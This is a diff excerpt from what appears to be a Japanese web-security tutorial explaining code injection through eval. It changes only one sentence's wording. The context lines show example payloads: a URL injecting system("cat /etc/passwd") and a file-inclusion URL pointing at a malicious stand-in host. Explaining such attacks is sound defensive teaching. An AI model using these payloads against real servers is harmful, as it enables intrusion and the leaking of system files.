@@ -334,7 +334,7 @@ http://example.com/page.php?file=http://www.trap.com/malicious
 ```
 http://example.com/page.php?data=system("cat /etc/passwd");
 ```
-このとき、サーバ側でクエリパラメータ`data`の値をデシリアライズするために、`eval`関数に`data`をそのまま渡す実装になっていると、`system("cat /etc/passwd");`がコードとして解釈・実行される。
+このとき、サーバ側でクエリパラメータ`data`の値をデシリアライズするために、`eval`関数に`data`をそのまま渡す実装が存在する場合、`system("cat /etc/passwd");`がコードとして解釈・実行される。
 
 今回のケースは、`cat /etc/passwd`の実行により、サーバ内の秘密情報が外部に漏洩する例だが、その他にもサイトの改ざんや、不正機能の実行など、[OSコマンド・インジェクション攻撃](#osコマンドインジェクション)と同様の被害が発生する。
 
